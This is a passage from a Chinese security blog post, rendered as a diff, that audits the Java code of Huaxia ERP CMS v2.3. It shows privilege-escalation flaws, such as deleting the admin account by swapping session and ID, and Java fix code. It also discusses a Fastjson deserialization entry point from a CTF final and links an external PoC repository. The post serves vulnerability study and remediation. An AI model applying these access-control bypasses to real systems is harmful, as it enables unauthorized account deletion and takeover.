+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/deteleUserByID.png" class="">
+
+<p>再用我们普通用户权限去抓包，替换 Session，替换 ID，成功删除 admin 的账户。这里的水平越权与垂直越权都是存在的。</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/deleteAdmin.png" class="">
+
+<p>再登录，就是用户不存在了</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/FailedLogin.png" class="">
+
+<h4 id="越权修改用户信息"><a href="#越权修改用户信息" class="headerlink" title="越权修改用户信息"></a>越权修改用户信息</h4><p>对应的接口是 <code>updateUser</code></p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/updateUserController.png" class="">
+
+<p>去到 Service 层，这里有一个 <code>checkUserNameAndLoginName(ue);</code> 的语句，跟进去看一下</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/updateUserNoJudge.png" class="">
+
+<p><code>checkUserNameAndLoginName()</code> 做了一个什么业务呢，它进行 <code>UserName</code> 与 <code>loignName</code> 是否为空的判断</p>
+<p>我们先看 <code>loginName</code> 是否为空的判断</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/getUserListByloginName.png" class="">
+
+<p>再看 <code>userName</code></p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/getUserListByUserName.png" class="">
+
+<blockquote>
+<p>乍一看代码好像没啥问题，这里最大的问题是没有把 <code>loginName</code> 或是 <code>UserName</code> 与 ID 进行一个匹配。</p>
+</blockquote>
+<p>我之前在学开发的时候也被人这么说过，大致意思就是 “这种操作你怎么会不进行一个 ID 与 userName 的判断的啊？亏你还是学安全的”；</p>
+<p>具体的复现就先不复现了，我们重点关注越权漏洞的修复</p>
+<h4 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>实现方式也很简单，在 Mapper 的 SQL 语句中加上 <code>selectIdByUserName</code>  就可以了，这样的话我们只需要进行如下判断</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Long</span> userId<span class="token operator">=</span>userEx<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">String</span> loginName<span class="token operator">=</span>userEx<span class="token punctuation">.</span><span class="token function">getLoginName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span>userId<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token function">getIdByLoginName</span><span class="token punctuation">(</span>loginName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
+    <span class="token comment">// 这里面判断匹配，进行业务代码实现  </span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">return</span><span class="token punctuation">;</span>  
+<span class="token punctuation">&#125;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="7-经测试，不存在-log4j2-漏洞"><a href="#7-经测试，不存在-log4j2-漏洞" class="headerlink" title="7.  经测试，不存在 log4j2 漏洞"></a>7.  经测试，不存在 log4j2 漏洞</h3><p>之前看其他师傅的文章说，看组件还是有 log4j2 的漏洞的，其实根本没有啊，对应的 maven 仓库，并不显示存在 log4j2 漏洞</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/MVN.png" class="">
+
+<h2 id="0x04-关于蓝帽杯决赛-awd-Plus-对于这个-CMS-变样考法的思考"><a href="#0x04-关于蓝帽杯决赛-awd-Plus-对于这个-CMS-变样考法的思考" class="headerlink" title="0x04 关于蓝帽杯决赛 awd Plus 对于这个 CMS 变样考法的思考"></a>0x04 关于蓝帽杯决赛 awd Plus 对于这个 CMS 变样考法的思考</h2><ul>
+<li>当时因为我自己的一些原因没有修出来，赛后看其他队伍的 WP 是这么修的。</li>
+</ul>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/ban.png" class="">
+
+<p>其实我是有点不太理解的，如果只是一个单纯的入口的话要开启 AutoType 才可以吧，不明白为什么这里算是漏洞点了。</p>
+<p>在请教过 Y4tacker 师傅之后这里总算是明白了！</p>
+<p>1.2.55 的版本也是存在能够不开启 <code>AutoType</code> 的 PoC 的，而且也不少，所以这里也是存在漏洞的。具体的 PoC 可以参考这个仓库<a target="_blank" rel="noopener" href="https://github.com/safe6Sec/Fastjson">https://github.com/safe6Sec/Fastjson</a></p>
+<h3 id="重要点"><a href="#重要点" class="headerlink" title="重要点"></a>重要点</h3><p><code>AutoType</code> 为 false 时 :先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错</p>
+<p><code>AutoType</code> 为 true 时 :先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤</p>
+<p>要用的 PoC 是 fastjson&lt;&#x3D;1.2.68 的攻击方法，正好这里也有 <code>hikari</code> 的库，所以这个题目应该是这么打的。</p>
+<p>至于在比赛当中的修复，直接把这个入口类 ban 掉即可。有一些其他接口也是存在 <code>parseObject</code> 的反序列化入口，但是输入并不可控，就没有必要管了。</p>
+<h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>审计 Java 项目可以直接通过全局搜索进行白盒的代码审计，尤其是 SQL 注入，fastjson 反序列化这种漏洞，尤为明显。</p>
+<p>刚入门 Java 不久，还很菜，文章中如有写的不好的地方还望请师傅们指出，感激不尽！</p>
+<h2 id="0x06-参考资料"><a href="#0x06-参考资料" class="headerlink" title="0x06 参考资料"></a>0x06 参考资料</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/14856437.html">https://www.cnblogs.com/bmjoker/p/14856437.html</a></p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    
+<div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li class="post-title">
+            <span class="type">本文标题</span>：<span class="content">Java 代码审计之华夏 ERP CMS v2.3</span>
+        </li>
+        <li class="post-author">
+            <span class="type">本文作者</span>：<span class="content">Drunkbaby</span>
+        </li>
+        <li class="post-time">
+            <span class="type">创建时间</span>：<span class="content">2022-09-30 21:32:01</span>
+        </li>
+        <li class="post-link">
+            <span class="type">本文链接</span>：<span class="content">2022/09/30/Java-代码审计之华夏-ERP-CMS-V2.3/</span>
+        </li>
+        <li class="post-license">
+            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
+        </li>
+    </ul>
+    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/Java/">#Java</a>&nbsp;
+                        </li>
+                    
+                        <li class="tag-item">
+                            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">#代码审计</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item">Java反序列化之C3P0链</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2022/09/28/%E5%88%B7%E5%8A%9B%E6%89%A3%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E7%AE%97%E6%B3%95%E9%81%97%E6%BC%8F%E7%82%B9/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">刷力扣过程中的算法遗漏点</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments"></i>&nbsp;评论
+    </div>
+    
+        
+            
+
+    <div class="valine-container">
+        <script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script data-pjax>
+          function loadValine() {
+
+            const config = {
+              el: '#vcomments',
+              appId: 'mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va',
+              appKey: 'ermlV1eoB1YODT088EdXjo6C',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: 'just go go',
+              lang: 'zh-CN'.toLowerCase()
+            }
+
+            if ('') {
+              config.serverURLs = ''
+            }
+
+            new Valine(config)
+
+            function getAuthor(language) {
+              switch (language) {
+                case 'en':
+                  return 'Author'
+                case 'zh-CN':
+                  return '博主'
+                default:
+                  return 'Master'
+              }
+            }
+
+            // Add "Author" identify
+            const getValineDomTimer = setInterval(() => {
+              const vcards = document.querySelectorAll('#vcomments .vcards .vcard')
+              if (vcards.length > 0) {
+                let author = 'Drunkbaby'
+
+                if (author) {
+                  for (let vcard of vcards) {
+                    const vnick_dom = vcard.querySelector('.vhead .vnick')
+                    const vnick = vnick_dom.innerHTML
+                    if (vnick === author) {
+                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                    }
+                  }
+                }
+                clearInterval(getValineDomTimer)
+              } else {
+                clearInterval(getValineDomTimer)
+              }
+            }, 2000)
+          }
+
+          if ('true' === 'true') {
+            const loadValineTimeout = setTimeout(() => {
+              loadValine()
+              clearTimeout(loadValineTimeout)
+            }, 1000)
+          } else {
+            window.addEventListener('DOMContentLoaded', loadValine)
+          }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3"><span class="nav-text">Java 代码审计之华夏 ERP CMS v2.3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E7%8E%AF%E5%A2%83"><span class="nav-text">0x02 环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-text">0x03 代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%AE%A1%E8%AE%A1%E5%87%86%E5%A4%87"><span class="nav-text">1. 审计准备</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#pom-xml"><span class="nav-text">pom.xml</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Filter-%E5%AE%A1%E8%AE%A1"><span class="nav-text">Filter 审计</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E%E5%AE%A1%E8%AE%A1%E5%AE%8C-Filter-%E5%90%8E%E7%9A%84%E6%80%9D%E8%80%83"><span class="nav-text">关于审计完 Filter 后的思考</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%A1%E8%AE%A1%E5%87%86%E5%A4%87%E5%B0%8F%E7%BB%93"><span class="nav-text">审计准备小结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-SQL-%E6%B3%A8%E5%85%A5"><span class="nav-text">2. SQL 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%B1%E8%B4%A5%E7%9A%84-SQL-%E6%B3%A8%E5%85%A5"><span class="nav-text">失败的 SQL 注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%88%90%E5%8A%9F%E7%9A%84-SQL-%E6%B3%A8%E5%85%A5"><span class="nav-text">成功的 SQL 注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-%E6%B3%A8%E5%85%A5%E7%9A%84%E4%BF%AE%E5%A4%8D"><span class="nav-text">SQL 注入的修复</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E4%B8%A4%E4%B8%AA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E8%B6%8A%E6%9D%83%EF%BC%88%E6%9D%83%E9%99%90%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87%EF%BC%89"><span class="nav-text">3. 两个白名单的越权（权限校验绕过）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A3%E5%B8%B8%E4%B8%9A%E5%8A%A1-URL-%E5%8A%A0%E7%99%BD"><span class="nav-text">正常业务 URL 加白</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B5%84%E6%BA%90%E5%8A%A0%E7%99%BD"><span class="nav-text">资源加白</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#URL-%E5%8A%A0%E7%99%BD"><span class="nav-text">URL 加白</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%AD%98%E5%82%A8%E5%9E%8B-XSS"><span class="nav-text">4. 存储型 XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-Fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE"><span class="nav-text">5. Fastjson 反序列化 RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-2"><span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="nav-text">6. 越权漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B6%8A%E6%9D%83%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE"><span class="nav-text">越权密码重置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B6%8A%E6%9D%83%E5%88%A0%E9%99%A4%E7%94%A8%E6%88%B7"><span class="nav-text">越权删除用户</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="nav-text">越权修改用户信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-3"><span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-%E7%BB%8F%E6%B5%8B%E8%AF%95%EF%BC%8C%E4%B8%8D%E5%AD%98%E5%9C%A8-log4j2-%E6%BC%8F%E6%B4%9E"><span class="nav-text">7.  经测试，不存在 log4j2 漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%85%B3%E4%BA%8E%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%86%B3%E8%B5%9B-awd-Plus-%E5%AF%B9%E4%BA%8E%E8%BF%99%E4%B8%AA-CMS-%E5%8F%98%E6%A0%B7%E8%80%83%E6%B3%95%E7%9A%84%E6%80%9D%E8%80%83"><span class="nav-text">0x04 关于蓝帽杯决赛 awd Plus 对于这个 CMS 变样考法的思考</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8D%E8%A6%81%E7%82%B9"><span class="nav-text">重要点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%B0%8F%E7%BB%93"><span class="nav-text">0x05 小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">0x06 参考资料</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2021</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">Drunkbaby</a>
+            
+        </div>
+        
+            <script async data-pjax
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
